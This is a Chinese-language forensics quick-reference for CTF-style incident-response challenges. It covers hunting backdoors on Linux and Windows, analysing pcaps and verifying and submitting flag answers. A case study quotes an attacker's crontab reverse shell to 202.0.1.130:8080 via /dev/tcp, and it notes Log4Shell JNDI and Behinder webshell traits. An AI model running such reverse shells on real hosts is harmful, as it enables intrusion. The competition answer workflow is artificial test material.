# 取证速查手册（Linux / Windows / pcap）+ 证据级答案校验

## 0. 通用心法与时间线

- **时间线先行**：攻击窗口用 `find / -newermt '<起>' ! -newermt '<止>'`（mtime）与 `-newerct`（ctime）；**chmod/chown 只改 ctime**；一条命令同时看两时间：`stat -c %y,%z,%n <文件…>`。
- **篡改检测**：`rpm -Va >/tmp/rva 2>/dev/null &`（后台慢跑）→ 之后 `grep usr/bin`、`grep usr/sbin`、`grep lib64` 找被替换/篡改的二进制（S=大小 5=md5 T=mtime U/G=属主 变）。
- **SUID 排查**：`find / -perm -4000 -type f -exec stat -c %A,%z,%n {} +`（用 `{} +` 避免反斜杠），按 ctime 排序与安装基线比对 —— 攻击日 ctime 变动的 SUID 文件即嫌疑。
- **大输出先落盘再分批读**（重定向 /tmp/x，再 head/sed 分段）；**截图不要人肉抄密文**，让靶机原地解密/比较，只打结论。

## 1. Linux 靶机

```bash
# 后门/持久化
cat /etc/crontab; ls -la /var/spool/cron/; ls /etc/cron.d/
systemctl list-unit-files --state=enabled; ls -la /etc/systemd/system/*.service
cat /etc/ld.so.preload 2>/dev/null                      # 恶意 so 预加载
ls -l --time-style=+%m-%d_%H:%M /tmp /var/tmp           # 落地脚本/凭据文件
find / -xdev -newermt '<攻击日>' ! -newermt '<次日>' -type f \( -name '*.sh' -o -name '*.py' -o -name '*.elf' \) 2>/dev/null | head
# 账号/密码
grep -E '(/bin/bash|/bin/sh)$' /etc/passwd              # 后门账号
awk -F: '($3==0)' /etc/passwd                           # UID=0 克隆
ls -la /etc/shadow* /etc/passwd*                        # 备份文件时间=改密时间
# SSH 侧
grep -c 'Accepted publickey' /var/log/secure*; zgrep -h ... /var/log/auth.log*   # CentOS=/var/log/secure
ls -la /root/.ssh/; cat /root/.ssh/authorized_keys
# SUID/suid 相关
find / -perm -4000 -type f -exec stat -c %A,%z,%n {} +
# 包完整性（被替换的 ssh/sshd/pam/su 等）
rpm -Va 2>/dev/null | grep -E 'S|5' | grep -E '/usr/(bin|sbin|libexec)' 
```

**本次实战案例（题目一·移动应用单机 tianjin26app，可作模板）**：
- 入口：Tomcat `webapps/ROOT/static/` 下发现 JSP WebShell → 访问日志定位攻击 IP 与首包时间；冰蝎特征：随机参数名（如 `libai`），首包返回 16 字符串 = 会话 AES-128-ECB 密钥；密文 `openssl enc -d -aes-128-ecb -K <hex> -nopad` 原地解密。
- 后门链：`/etc/crontab` 追加 `* * * * * root /bin/bash -i >&/dev/tcp/202.0.1.130/8080 0>&1`；SSH 凭据记录后门把 `user:pass` 写入 `/tmp/...`（登录进出均记）。
- 攻击者改动定位：`rpm -Va` 发现整个 openssh 套件（ssh/scp/sftp/sshd/…）大小+md5 变动 = 被植入记录后门；SUID 题用 `stat -c %A,%z,%n` 按 **ctime=攻击时刻** 锁定被 chmod 的文件（pam/openssh 相关）。
- 反弹 shell：`tshark -z conv,tcp` 找异常端口会话（如 4444/krb524），`-z follow,tcp,ascii,<stream>` 直接读攻击者敲的全部命令。

## 2. Windows 靶机（短命令、避引号/管道）

```cmd
schtasks /query /fo LIST /v          :: 计划任务（后门任务 XML 里找 C2）
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
net user; net localgroup administrators
netstat -ano > C:\nn.txt & findstr 10.0.10.200 C:\nn.txt     :: 回连 C2（避开管道）
dir C:\Windows\System32\Tasks & type C:\Windows\System32\Tasks\<任务名>
dir /s /b D:\Shares & type D:\Shares\HOW_TO_DECRYPT.txt      :: 勒索信
dir /x                                                        :: 中文/长文件名取 8.3 短名
```
```powershell
Get-ADPrincipalGroupMembership svc_backup | % Name           # （cmd 内禁用 % → 用 ForEach-Object）
Get-ScheduledTask -TaskPath \ ; Get-ChildItem D:\Shares -Recurse -File | Group-Object Extension | Sort Count -Desc
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($ps))   # 长命令 → -EncodedCommand
```
- 复杂命令走：单引号内层 → `-EncodedCommand "<b64>"`（外层必加引号）→ 或导入文件抽屉落地 `.bat/.ps1` 再跑。
- 锁屏：`cad.js`（Ctrl+Alt+Del→口令）；"意外关机原因"对话框 → 回车。

## 3. pcap 分析（"一趟全量提取 + 之后 findstr"）

```bat
:: 对数百 MB 的大 pcap：一次扫描把关心字段落盘，之后全部用 findstr/grep 秒查
tshark -r full.pcapng -Y "http.request or dns.qry.name or tcp.flags.syn==1" ^
  -T fields -e frame.number -e frame.time -e ip.src -e ip.dst -e tcp.dstport ^
  -e http.host -e http.request.uri -e http.user_agent -e dns.qry.name > C:\Temp\ev.txt 2>nul
```
```bash
# 会话与流
tshark -r x.pcapng -q -z conv,tcp                      # 异常端口/长连接
tshark -r x.pcapng -q -z follow,tcp,ascii,<N>           # 直接读某个会话明文（反弹 shell 命令全在里）
tshark -r x.pcapng -Y 'frame contains jndi' -T fields -e frame.number -e ip.src -e ip.dst -e http.user_agent
tshark -r x.pcapng -Y http.request -T fields -e ip.src -e http.host -e http.request.uri | sort | uniq -c | sort -rn
```

| 题目类型 | 取法 |
|---|---|
| 攻击者源 IP/被攻击服务 | `http.request` 按 `ip.dst:tcp.dstport` 分组计数 |
| Log4Shell/JNDI（源、LDAP 地址、命令） | `frame contains jndi`；载荷常在 UA → `jndi:ldap://IP:PORT/...` |
| 下发脚本 URL | `ip.src=受害 → dst=攻击者` 且 uri 以 .sh/.py/.elf 结尾；或 `--export-objects http,<dir>`（小 pcap 才用） |
| 定时回连后门 | 同一 uri 时间间隔 ≈60s |
| C2 地址 | 计划任务/后门参数里的 IP:PORT |
| WebShell 流量 | 定位固定 jsp/php 路径的 POST；冰蝎=AES-128-ECB（密钥=握手返回的 16 字符串）；哥斯拉=PHP_XOR_BASE64 等 |

## 4. ★证据级答案校验（OCR/读屏不可信时一锤定音）

```powershell
function MD5Of([string]$s){ $m=[Security.Cryptography.MD5]::Create()
  (($m.ComputeHash([Text.Encoding]::ASCII.GetBytes($s))|ForEach-Object{$_.ToString('x2')}) -join '') }
# 1) 让靶机自己算 MD5（值不经过你的 OCR）
# 2) 本地复算 + 单字符变体穷举（32 位 hex × 15 种替换，防 l/1、0/O 误读）
$cand='flag5{8867db59bdef87dd147cf2b064836353}'; $guest='<靶机回显>';
"MATCH = " + ((MD5Of $cand) -eq $guest)
# 判读：MATCH=True 且变体 0 命中 → 该值是该 MD5 的唯一原像，读屏 100% 正确
```
- 读屏友好化：让靶机**逐字符展开**（`'x'.ToCharArray() -join ' '`）再读；或输出 hex/`od -An -tu1` 本地还原；
- 能用正则程序化提取的就别 OCR（例：`[regex]::Match($t,'Han[A-Za-z0-9]{3,12}@[A-Za-z0-9]{2,8}')`）。

## 5. 结果外带（无文件通道时）

1. 写进窗口标题 `title <值>` → 截图读；2. notepad 打开结果文件上屏再截；3. 内网横向：靶机 A→靶机 B 的 `TcpClient/python socket`（`guest/recv.py` + `startrecv.sh`）；4. 平台 guest 文件接口仅 RDP 可用（VNC 不支持）。

## 6. 提交阶段纪律

- 双证据交叉 + 关键值校验 → `submit.js --dry` 核对题面 → `submit.js "<题面>" "<答案>"`；
- 看 `RESULT {JSON}` 与退出码：`0 正确 / 2 错误 / 3 重复锁定 / 4 未找到 / 5 歧义 / 9 环境错`；
- `answers.json` 是防重账本：正确/锁定永不再交；判错的题要重证后加 `--retry-wrong` 再交；
- 每轮 `submit.js --list` 对账，更新看板，**绝不重复轰炸同一题**。
